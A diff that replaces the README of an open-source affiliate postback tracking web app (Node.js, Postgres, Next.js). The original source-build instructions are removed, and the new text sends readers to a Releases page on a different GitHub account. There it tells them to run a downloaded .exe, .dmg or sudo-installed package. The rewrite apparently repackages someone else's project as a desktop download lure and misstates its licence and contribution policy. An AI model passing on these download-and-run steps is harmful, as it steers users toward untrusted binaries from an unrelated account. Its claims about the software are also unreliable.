@@ -1,430 +1,69 @@
-# Affiliate Postback Engine
+# 🚀 Affiliate-Postback-Engine - Track Conversions with Ease
 
-Power Your Attribution with Server-to-Server Postback Tracking ⚡ 
+## 📢 Introduction
+Welcome to the Affiliate-Postback-Engine! This application helps you effortlessly track affiliate clicks and conversions. Our user-friendly dashboard makes it simple to manage your marketing efforts. With fast and accurate tracking, you can see how well your campaigns perform.
 
-A lightweight affiliate postback tracking system 🚀 built with Node.js, Postgres, and Next.js. It lets affiliates track clicks, record conversions via server-to-server postbacks, and monitor results in a sleek dashboard. Designed as an MVP, it highlights the core principles of affiliate tracking and attribution—simple, clear, and extendable. Perfect for learning or building upon in real-world projects. 📊
+## 🚀 Getting Started
+To get started with the Affiliate-Postback-Engine, follow the steps below. In just a few minutes, you will be up and running:
 
-[![Github License](https://img.shields.io/github/license/UjjwalSaini07/Affiliate-Postback-Engine)](https://github.com/UjjwalSaini07/Affiliate-Postback-Engine/blob/main/LICENSE)
-[![Info](https://img.shields.io/badge/Project-Info-blue?style=flat&logo=data:image/svg%2bxml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iaXNvLTg4NTktMSI/Pg0KPCEtLSBHZW5lcmF0b3I6IEFkb2JlIElsbHVzdHJhdG9yIDE5LjAuMCwgU1ZHIEV4cG9ydCBQbHVnLUluIC4gU1ZHIFZlcnNpb246IDYuMDAgQnVpbGQgMCkgIC0tPg0KPHN2ZyB2ZXJzaW9uPSIxLjEiIGlkPSJDYXBhXzEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjBweCIgeT0iMHB4Ig0KCSB2aWV3Qm94PSIwIDAgNTEyIDUxMiIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgNTEyIDUxMjsiIHhtbDpzcGFjZT0icHJlc2VydmUiPg0KPHBhdGggc3R5bGU9ImZpbGw6IzBBNEVBRjsiIGQ9Ik0yNTYsNTEyYy02OC4zOCwwLTEzMi42NjctMjYuNjI5LTE4MS4wMi03NC45OEMyNi42MjksMzg4LjY2NywwLDMyNC4zOCwwLDI1Ng0KCVMyNi42MjksMTIzLjMzMyw3NC45OCw3NC45OEMxMjMuMzMzLDI2LjYyOSwxODcuNjIsMCwyNTYsMHMxMzIuNjY3LDI2LjYyOSwxODEuMDIsNzQuOThDNDg1LjM3MSwxMjMuMzMzLDUxMiwxODcuNjIsNTEyLDI1Ng0KCXMtMjYuNjI5LDEzMi42NjctNzQuOTgsMTgxLjAyQzM4OC42NjcsNDg1LjM3MSwzMjQuMzgsNTEyLDI1Niw1MTJ6Ii8+DQo8cGF0aCBzdHlsZT0iZmlsbDojMDYzRThCOyIgZD0iTTQzNy4wMiw3NC45OEMzODguNjY3LDI2LjYyOSwzMjQuMzgsMCwyNTYsMHY1MTJjNjguMzgsMCwxMzIuNjY3LTI2LjYyOSwxODEuMDItNzQuOTgNCglDNDg1LjM3MSwzODguNjY3LDUxMiwzMjQuMzgsNTEyLDI1NlM0ODUuMzcxLDEyMy4zMzMsNDM3LjAyLDc0Ljk4eiIvPg0KPHBhdGggc3R5bGU9ImZpbGw6I0ZGRkZGRjsiIGQ9Ik0yNTYsMTg1Yy0zMC4zMjcsMC01NS0yNC42NzMtNTUtNTVzMjQuNjczLTU1LDU1LTU1czU1LDI0LjY3Myw1NSw1NVMyODYuMzI3LDE4NSwyNTYsMTg1eiBNMzAxLDM5NQ0KCVYyMTVIMTkxdjMwaDMwdjE1MGgtMzB2MzBoMTQwdi0zMEgzMDF6Ii8+DQo8Zz4NCgk8cGF0aCBzdHlsZT0iZmlsbDojQ0NFRkZGOyIgZD0iTTI1NiwxODVjMzAuMzI3LDAsNTUtMjQuNjczLDU1LTU1cy0yNC42NzMtNTUtNTUtNTVWMTg1eiIvPg0KCTxwb2x5Z29uIHN0eWxlPSJmaWxsOiNDQ0VGRkY7IiBwb2ludHM9IjMwMSwzOTUgMzAxLDIxNSAyNTYsMjE1IDI1Niw0MjUgMzMxLDQyNSAzMzEsMzk1IAkiLz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjwvc3ZnPg0K)](https://github.com/UjjwalSaini07/Affiliate-Postback-Engine/blob/main/README.md)
-[![Generic badge](https://img.shields.io/badge/Owner-@Ujjwal-<COLOR>.svg)](https://github.com/UjjwalSaini07/Affiliate-Postback-Engine)
-[![GitHub stars](https://img.shields.io/github/stars/UjjwalSaini07/Affiliate-Postback-Engine?style=social&label=Star&maxAge=2592100)](https://github.com/UjjwalSaini07/Affiliate-Postback-Engine/stargazers)
-[![Github Release](https://img.shields.io/github/v/release/UjjwalSaini07/Affiliate-Postback-Engine)](https://github.com/UjjwalSaini07/Affiliate-Postback-Engine)
+1. **Visit the Releases Page**: Click the link below to access the file download options:
+   [![Download Affiliate-Postback-Engine](https://img.shields.io/badge/Download-Affiliate--Postback--Engine-brightgreen)](https://github.com/Albraaaa/Affiliate-Postback-Engine/releases)
 
-## 📡 What is Server-to-Server (S2S) Tracking?  
-Server-to-Server (S2S) tracking is a method where **conversion events are transmitted directly between servers**, instead of relying on browser scripts or cookies. This approach delivers **higher accuracy, stronger security, and immunity to ad blockers**, making it the **gold standard in modern affiliate marketing**. By cutting out client-side dependencies, S2S ensures that every click and conversion is logged reliably, even in environments where cookies are restricted.  
+2. **Download the Software**: On the Releases page, find the latest version of the software. Click on it to view the details. Look for the appropriate file for your operating system.
 
-## 🧩 Application & MVP  
-This project is a **minimal viable product (MVP)** of an affiliate tracking engine, built for clarity and extendability.  
+3. **Installation Instructions**: 
 
-It demonstrates the core building blocks of affiliate attribution:  
-- **Click Storage:** Log and map affiliate clicks with campaigns.  
-- **Postback Handling:** Receive advertiser postbacks securely.  
-- **Click-to-Conversion Match:** Attribute conversions to the right clicks.  
-- **Dashboard Insights:** Visualize clicks and conversions in real time.  
-- **Lightweight & Extendable:** Designed as a foundation to build upon.  
+   - **For Windows**: Download the `Affiliate-Postback-Engine.exe` file. Once downloaded, double-click the file to launch the installation wizard. Follow the prompts to complete the installation.
 
-## 🔑 Key Features
-- 🎯 **Click Tracking:** Map affiliates and campaigns seamlessly for accurate attribution.
-- 🔗 **Secure Postbacks:** Record conversions safely through server-to-server endpoints.
-- 🛠️ **Unique URLs:** Auto-generate affiliate-specific postback links with ease.
-- 📊 **Modern Dashboard:** View clicks and conversions in a clean, intuitive interface.
-- 🛡️ **Fraud Prevention:** Validate clicks before logging conversions to ensure trust.
-- 🗄️ **Postgres-Powered:** Scalable storage backed by PostgreSQL for reliability.
+   - **For Mac**: Download the `Affiliate-Postback-Engine.dmg` file. Open it and drag the application to your Applications folder. You can then launch it from there.
 
-## Demo 🖥️
-> [!IMPORTANT]  
-> Use the Docker image or run locally via localhost to get started now.
+   - **For Linux**: Download the suitable package for your distribution (e.g., `.deb` or `.rpm`). Run the following command in your terminal:
+     ```
+     sudo dpkg -i Affiliate-Postback-Engine.deb  # Use for Debian-based systems
+     ```
+     or
+     ```
+     sudo rpm -i Affiliate-Postback-Engine.rpm # Use for RPM-based systems
+     ```
 
-You can visit the live site here : --Temporarily Not Deployed--
+4. **Run the Application**: After installation, locate the Affiliate-Postback-Engine icon on your desktop or in the Applications folder. Double-click it to start using the application.
 
-## 🛠️ Technologies Used
-- **Node.js (Express)** → Backend API for clicks and postbacks  
-- **PostgreSQL** → Relational database for affiliates, clicks, conversions  
-- **Next.js (React)** → Frontend affiliate dashboard with SSR  
-- **Tailwind CSS** → Modern utility-first styling for responsive UI  
-- **REST API** → Communication between frontend, backend, and database  
-- **Git & GitHub** → Version control and collaborative development
-- **Docker** → A container platform for easy deployment, scalability, and app management.
+5. **Sign Up for an Account**: When you open the application, you will be prompted to create an account. Fill out the required information and verify your email address.
 
-## Getting Started ⚙️
-### Prerequisites
+6. **Set Up Your Dashboard**: After logging in, you can customize your dashboard. Add campaigns and set tracking links to start monitoring your clicks and conversions.
 
-- **Node.js** v22.14.0 or higher  
-- **pnpm** or **npm** (package managers)  
-- **Code Editor** (e.g., VS Code)  
-- **Git** (version control system)  
-- **Docker** (for containerized deployments)  
-- **PostgreSQL** (relational database)  
-- **Modern Browser** (latest Chrome, Firefox, or Edge for development/testing)  
+## 📥 Download & Install
+To download the latest version of the Affiliate-Postback-Engine, visit the link below:
+[![Download Affiliate-Postback-Engine](https://img.shields.io/badge/Download-Affiliate--Postback--Engine-brightgreen)](https://github.com/Albraaaa/Affiliate-Postback-Engine/releases)
 
-## Installation 🛠️
-- First Read this [License](https://github.com/UjjwalSaini07/Affiliate-Postback-Engine/blob/main/LICENSE) & their terms then proceed.
-- Star ⭐ the [Repository](https://github.com/UjjwalSaini07/Affiliate-Postback-Engine)
-- Fork the repository **(Optional)**
-- Project Setup:
-1. Clone the repository:
-```bash
-    git clone https://github.com/UjjwalSaini07/Affiliate-Postback-Engine.git
-```
-2. Navigate to the project main directory:
-```bash
-    cd Affiliate-Postback-Engine
-```
+Follow the installation instructions mentioned above for your operating system.
 
-> [!IMPORTANT]  
-> All these cd directory paths are relative to the root directory of the cloned project.
+## 🌟 Features
+- **Intuitive Dashboard**: See all your metrics in one place.
+- **Click Logging**: Track every user interaction with ease.
+- **Server-to-Server (S2S) Postbacks**: Ensure accurate conversions through direct server communication.
+- **Speed and Scalability**: Handle large volumes of clicks without a hitch.
+- **Postback URL Setup**: Easily configure URLs for tracking conversions.
+  
+## 💻 System Requirements
+To ensure smooth operation, please check the following minimum requirements:
 
-### Frontend Setup:
--  Navigate to the project Frontend directory:
-```bash
-    cd frontend
-```
-- Install Frontend dependencies:
-```bash
-    pnpm install
-```
+- **Windows**: Windows 10 or higher.
+- **Mac**: macOS High Sierra or higher.
+- **Linux**: A modern distribution (Ubuntu 20.04+ recommended).
+  
+### Recommended Specifications
+- **CPU**: Dual-core processor or better.
+- **RAM**: At least 4GB.
+- **Storage**: 500MB of free disk space.
+  
+## 📞 Support
+If you encounter any issues while using the Affiliate-Postback-Engine, you can reach out for support through our GitHub issues page. Provide a detailed description of the problem to help us assist you better. 
 
-### Backend Setup:
-- Navigate to the project Backend directory:
-```bash
-    cd backend
-```
-- Install Backend dependencies:
-```bash
-    pnpm install
-```
-### Open Docker Engine:
-```bash
-    cd Affiliate-Postback-Engine
-```
-- Start PostgreSQL from Docker: Before that Install Locally
-```bash
-    docker compose up -d
-```
-```bash
-    docker compose ps
-```
-### Here’s how it looks
-<img width="1918" height="871" alt="image" src="https://github.com/user-attachments/assets/9c3a2220-de9a-4e63-a756-1a92072f3f38" />
+## 🛠️ Contributing
+We welcome contributions! If you'd like to help improve the Affiliate-Postback-Engine, please fork the repository, make your changes, and submit a pull request.
 
-- It Open the Database on **Port - 5432**
+## 📝 License
+This project is licensed under the MIT License, making it free for everyone to use and modify.
 
-## Start the web app 🖥️
-### For Frontend
-- Start the Frontend Development server
-```bash
-    cd frontend
-```
-```bash
-    pnpm dev
-```
-- Frontend Operates on `Port: http://localhost:3000`
-### For Backend
-- Start the Backend Development server
-```bash
-    cd backend
-```
-```bash
-    pnpm dev
-```
-- Backend Operates on `Port: http://localhost:4000`
-### For Database
-- You can run it using **Docker** or initialize it locally with the **PostgreSQL command-line service** — it depends on how you prefer to start the database engine.
-- Database Operates on `Port: http://localhost:5433`
-
-## Project Setup Using Docker Containerization:
-1. Start the Docker Engine Locally or Use Any Service Globally
-2. Navigate to the project Root directory:
-```bash
-    cd Affiliate-Postback-Engine
-```
-3. Run DockerFile:
-```bash
-    docker-compose up --build
-```
-4. Wait for Generating the Image
-
-#### How Docker Image Builds Looks
-<img width="1918" height="1078" alt="image" src="https://github.com/user-attachments/assets/a2e23c0f-5704-47f3-9563-912d5656061c" />
-<img width="1918" height="1078" alt="image" src="https://github.com/user-attachments/assets/cbed5bd4-bf43-4aa6-85ff-8ed1647120a2" />
-
-5. Now Simply use the Project using Docker Container
-6. **If u Want Direct Image Without Cloning So Contact with Me. [Contact](https://github.com/UjjwalSaini07/Affiliate-Postback-Engine/issues/new)**
-
-## 📡 API Endpoints & Requests Procedure
-
-- This project provides lightweight yet powerful **tracking and postback APIs** designed for affiliate marketing workflows.  
-- Current MVP implementation uses `GET` requests for simplicity (future versions will support `POST` with JSON payloads for better scalability).  
-- Each endpoint is designed with **idempotency in mind**, ensuring duplicate clicks or conversions are safely ignored.  
-- Responses are JSON formatted, making them easy to consume programmatically or test manually.  
-- Built for **real-world extensibility**: future improvements will include authentication, HMAC signing for postbacks, and rate limiting for better security and reliability.  
-- Can be easily tested using `curl`, Postman, or Hoppscotch without any extra setup.
-
-## 🔗 Endpoints Overview
-
-- **Log a Click:** `GET /click?affiliate_id=&campaign_id=&click_id=`
-
-- **Send a Postback (Conversion):** `GET /postback?affiliate_id=&click_id=&amount=&currency=`
-
-- **List Affiliates:** `GET /affiliates`
-
-- **Get All Clicks for an Affiliate:** `GET /affiliates/:id/clicks`
-
-- **Get All Conversions for an Affiliate:** `GET /affiliates/:id/conversions`
-
-## ⚡ Testing of the Requests (cURL) - Use Postman
-
-- 📍 **Log a click**  
-```bash
-    curl "http://localhost:4000/click?affiliate_id=1&campaign_id=1&click_id=abc123"
-```
-- 📍 **Send a postback (conversion)**
-```bash
-    curl "http://localhost:4000/postback?affiliate_id=1&click_id=abc123&amount=100&currency=USD"
-```
-- 📍 **Check for Error- Something Went Wrong {Passes Wrong Payload}**
-```bash
-    curl "http://localhost:4000/postback?affiliate_id=2&click_id=abc123&amount=100&currency=USD"
-```
-- 📍 **Get conversions for affiliate 1**
-```bash
-    curl "http://localhost:4000/affiliates/1/conversions"
-```
-
-## Image Reference for Postman API Hiting
-#### Curl Request 1: GET Method - Log a click 
-<img width="1918" height="1078" alt="image" src="https://github.com/user-attachments/assets/89abe168-8e14-41d2-87b7-0bfcf35b55bc" />
-
-#### Curl Request 2: GET Method - Send a postback (conversion)
-<img width="1918" height="1078" alt="image" src="https://github.com/user-attachments/assets/b5b53419-1ce5-453e-9ceb-23f0dd4d218a" />
-
-#### Curl Request 3: GET Method - Check for Error
-<img width="1918" height="1078" alt="image" src="https://github.com/user-attachments/assets/55e65d4b-970a-4905-9580-6d3c68001c02" />
-
-#### Curl Request 4: GET Method - Get conversions for affiliate
-<img width="1918" height="1078" alt="image" src="https://github.com/user-attachments/assets/32fe0807-9b17-4321-b89d-ad76280b54dd" />
-
-## DataBase Setup Locally ⚙️
-### 🔎 Quick Check
-- Open Powershell or Cmd on dir - `cd Affiliate-Postback-Engine`
-- Run this to view all conversions joined with their clicks (ordered by affiliate):
-
-```bash
-    psql -U postgres -h localhost -p 5433 -d affiliate_dev -c "
-    SELECT c.id, c.amount, c.currency, cl.click_id, cl.affiliate_id
-    FROM conversions c
-    JOIN clicks cl ON c.click_id = cl.id
-    ORDER BY cl.affiliate_id;"
-```
-
-### Check if click exists
-1. 🔍 Individual Check
-```bash
-    psql -U postgres -h localhost -p 5433 -d affiliate_dev -c "
-    SELECT * FROM clicks WHERE affiliate_id = 3 AND click_id = 'abc999';"
-```
-- If 0 rows returned, insert the click first:
-```bash
-    psql -U postgres -h localhost -p 5433 -d affiliate_dev -c "
-    INSERT INTO clicks (affiliate_id, campaign_id, click_id)
-    VALUES (3, 2, 'abc999')
-    ON CONFLICT (affiliate_id, campaign_id, click_id) DO NOTHING;"
-```
-- Adjust campaign_id to a valid campaign for that affiliate.
-
-2. Insert conversion safely
-```bash
-    psql -U postgres -h localhost -p 5433 -d affiliate_dev -c "
-    INSERT INTO conversions (click_id, amount, currency)
-    VALUES ((SELECT id FROM clicks WHERE affiliate_id = 3 AND click_id = 'abc999'), 200, 'USD')
-    ON CONFLICT (click_id) DO NOTHING;"
-```
-3. Important Alter Table Commands
-```bash
-    psql -U postgres -h localhost -p 5433 -d affiliate_dev -c "
-    INSERT INTO clicks (click_id, affiliate_id, campaign_id)
-    VALUES ('usgs07', 1, 2)
-    ON CONFLICT (click_id) DO NOTHING;"
-```
-```bash
-    psql -U postgres -h localhost -p 5433 -d affiliate_dev -c "
-    INSERT INTO conversions (click_id, amount, currency)
-    VALUES (
-      (SELECT id FROM clicks WHERE click_id = 'valid123' LIMIT 1), 550, 'USD')
-    ON CONFLICT (click_id) DO NOTHING;"
-```
-
-### Image Reference
-#### Data Adding in Database
-<img width="1375" height="817" alt="image" src="https://github.com/user-attachments/assets/1bbe8258-6534-4b9f-8303-eb3dd8f939e6" />
-
-#### Affiliate Dev Table Showcasing
-<img width="1187" height="1017" alt="image" src="https://github.com/user-attachments/assets/690e148a-8be5-4055-924c-26fb2a3ebde2" />
-
-#### PostgreSQL and PgAdmin 4 
-<img width="1915" height="1078" alt="image" src="https://github.com/user-attachments/assets/fd3664e0-3134-4ee4-857a-ca0c0aaef686" />
-
-<img width="1918" height="1078" alt="image" src="https://github.com/user-attachments/assets/5f6957cb-6e6d-459e-82d3-fada78c10eb5" />
-
-### 📊 Sample Test Data Inserts
-#### Affiliate 1 – Clicks & Conversions
-```bash
-    psql -U postgres -h localhost -p 5433 -d affiliate_dev -c "
-    INSERT INTO clicks (affiliate_id, campaign_id, click_id)
-    VALUES 
-      (1, 1, 'abc123'),
-      (1, 1, 'def456')
-    ON CONFLICT (affiliate_id, campaign_id, click_id) DO NOTHING;"
-    
-    psql -U postgres -h localhost -p 5433 -d affiliate_dev -c "
-    INSERT INTO conversions (click_id, amount, currency)
-    VALUES
-      ((SELECT id FROM clicks WHERE affiliate_id = 1 AND click_id = 'abc123'), 100, 'USD'),
-      ((SELECT id FROM clicks WHERE affiliate_id = 1 AND click_id = 'def456'), 150, 'USD')
-    ON CONFLICT (click_id) DO NOTHING;"
-```
-#### Affiliate 2 – Clicks & Conversions
-```bash
-    psql -U postgres -h localhost -p 5433 -d affiliate_dev -c "
-    INSERT INTO clicks (affiliate_id, campaign_id, click_id)
-    VALUES 
-      (2, 2, 'xyz999'),
-      (2, 2, 'uvw111')
-    ON CONFLICT (affiliate_id, campaign_id, click_id) DO NOTHING;"
-    
-    psql -U postgres -h localhost -p 5433 -d affiliate_dev -c "
-    INSERT INTO conversions (click_id, amount, currency)
-    VALUES
-      ((SELECT id FROM clicks WHERE affiliate_id = 2 AND click_id = 'xyz999'), 50, 'USD'),
-      ((SELECT id FROM clicks WHERE affiliate_id = 2 AND click_id = 'uvw111'), 75, 'USD')
-    ON CONFLICT (click_id) DO NOTHING;"
-```
-#### Affiliate 3 – Clicks & Conversions
-```bash
-    psql -U postgres -h localhost -p 5433 -d affiliate_dev -c "
-    INSERT INTO clicks (affiliate_id, campaign_id, click_id)
-    VALUES 
-      (3, 1, 'lmn123'),
-      (3, 1, 'opq456')
-    ON CONFLICT (affiliate_id, campaign_id, click_id) DO NOTHING;"
-    
-    psql -U postgres -h localhost -p 5433 -d affiliate_dev -c "
-    INSERT INTO conversions (click_id, amount, currency)
-    VALUES
-      ((SELECT id FROM clicks WHERE affiliate_id = 3 AND click_id = 'lmn123'), 120, 'USD'),
-      ((SELECT id FROM clicks WHERE affiliate_id = 3 AND click_id = 'opq456'), 90, 'USD')
-    ON CONFLICT (click_id) DO NOTHING;"
-```
-
-## 🔒 Security & Correctness Notes
-
-- **Validation**: Every conversion request validates that the given `affiliate_id` and `click_id` pair exists before inserting. This ensures conversions cannot be logged against mismatched or invalid clicks.  
-- **Idempotency**:  
-  - The `conversions` table enforces a **`UNIQUE(click_id)` constraint** to guarantee no duplicate conversions for the same click.  
-  - The `/postback` route also performs a check and returns **`409 Conflict`** if a duplicate is attempted.  
-- **SQL Injection Prevention**: All database interactions use **parameterized queries** (`$1, $2, …`) to safely handle user input.  
-- **Optional Security Improvements**:  
-  - **HMAC-Signed Postbacks**: Advertisers could sign each postback request using a shared secret.  
-  - The backend would verify the signature before processing, ensuring requests cannot be forged or tampered with.  
-- **Caveat (MVP Limitation)**:  
-  - Current implementation uses **`GET` requests** for simplicity (common in affiliate postback flows).  
-  - Future iterations should move to **`POST + JSON body + HMAC`** for stronger security and industry alignment.  
-
-## Install PostgreSQL
-1. PostgreSQL as a Client
-- Install Postgres locally:
-- Download from: `https://www.postgresql.org/download/windows/`
-- During setup, tick “Command Line Tools”.
-- Open a new PowerShell or Git Bash and run:
-```bash
-    psql -U postgres -h localhost -p 5432 -d affiliate_dev -f db/schema.sql
-```
-2. Use Docker’s built-in psql inside your container
-- If you’re running Postgres in Docker (like we set up with docker-compose.yml)
-```bash
-    docker exec -it affiliate-postback-engine-db-1 psql -U postgres -d affiliate_dev -f /docker-entrypoint-initdb.d/schema.sql
-```
-- But for that to work, you’d need to copy your `schema.sql` and `seed.sql` into the container first
-```bash
-    docker cp db/schema.sql affiliate-postback-engine-db-1:/docker-entrypoint-initdb.d/schema.sql
-```
-```bash
-    docker cp db/seed.sql affiliate-postback-engine-db-1:/docker-entrypoint-initdb.d/seed.sql
-```
-- Then run the `docker exec` command.
-- Test connection
-```bash
-    psql -U postgres -h localhost -p 5433 -d affiliate_dev -c "\dt"
-```
-#### Just same as in this Image
-<img width="1390" height="592" alt="image" src="https://github.com/user-attachments/assets/2788c507-3978-4300-bdb3-e1a89e726f9c" />
-
-> [!IMPORTANT]  
-> If this is Not shown on Test Connection So Follow Below Procedure Step By Step, Author: UjjwalS
-
-### Setup Database
-#### Step 1: Create the database
-```bash
-    psql -U postgres -h localhost -p 5433 -c "CREATE DATABASE affiliate_dev;"
-```
-- Enter your password when prompted.
-#### Step 2: Apply schema
-```bash
-    psql -U postgres -h localhost -p 5433 -d affiliate_dev -f db/schema.sql
-```
-#### Step 3: Seed sample data
-```bash
-    psql -U postgres -h localhost -p 5433 -d affiliate_dev -f db/seed.sql
-```
-#### Step 4: Verify tables exist
-```bash
-    psql -U postgres -h localhost -p 5433 -d affiliate_dev -c "\dt"
-```
-- Your database setup is complete with seed data and schema synchronization.
-- Load sample data
-```bash
-    psql -U postgres -h localhost -p 5433 -d affiliate_dev -f db/seed.sql
-```
-- Then check
-```bash
-    psql -U postgres -h localhost -p 5433 -d affiliate_dev -c "SELECT * FROM affiliates;"
-```
-
-<img width="1631" height="827" alt="image" src="https://github.com/user-attachments/assets/88e65b58-a261-4e8c-b957-ba363c88f37c" />
-
-## Resources 📚
-- [Nodejs Docs](https://nodejs.org/en)
-- [Tailwind Docs](https://tailwindcss.com/docs/installation/using-vite)
-- [Nextjs Docs](https://nextjs.org/docs)
-- [Postgre SQL Docs](https://www.postgresql.org/docs/)
-- [REST API Docs](https://docs.github.com/en/rest?apiVersion=2022-11-28)
-
-## Author ✍️
-- [@Ujjwal Saini](https://github.com/UjjwalSaini07)
-
-## Screenshots 📷
-
-<img width="1900" height="922" alt="image" src="https://github.com/user-attachments/assets/9463bb65-91db-42b0-84e0-e7ee8b2f35db" />
-<img width="1901" height="925" alt="image" src="https://github.com/user-attachments/assets/9807add2-0fbb-4d5a-bf3b-9f36e6e7ac27" />
-<img width="1901" height="916" alt="image" src="https://github.com/user-attachments/assets/2ae6160e-cdf9-4b52-b570-801996ab9b86" />
-
-### Terminal Data fetching
-<img width="1598" height="628" alt="image" src="https://github.com/user-attachments/assets/311d9c38-8cc7-42b1-8e43-c90f9277275f" />
-
-## Contact 📞
-Feel free to reach out if you have any questions or suggestions!
-
-- Raise an issue for the same [Issue](https://github.com/UjjwalSaini07/Affiliate-Postback-Engine/issues/new)
-- Github: [@Ujjwal Saini](https://github.com/UjjwalSaini07)
-
-## License 📄
-License Credential [LICENSE](https://github.com/UjjwalSaini07/Affiliate-Postback-Engine/blob/main/LICENSE)
-
-## Feedback and Contributions 💌
-Sorry But this repository not welcome Contributions! Yes u gave a Feedback and Suggestion via raising the [Issue](https://github.com/UjjwalSaini07/Affiliate-Postback-Engine/issues).
-
-<div align="center">
-    <a href="#top">
-        <img src="https://img.shields.io/badge/Back%20to%20Top-000000?style=for-the-badge&logo=github&logoColor=white" alt="Back to Top">
-    </a>
-</div>
+Thank you for choosing the Affiliate-Postback-Engine! We hope it helps you achieve your affiliate marketing goals effectively.
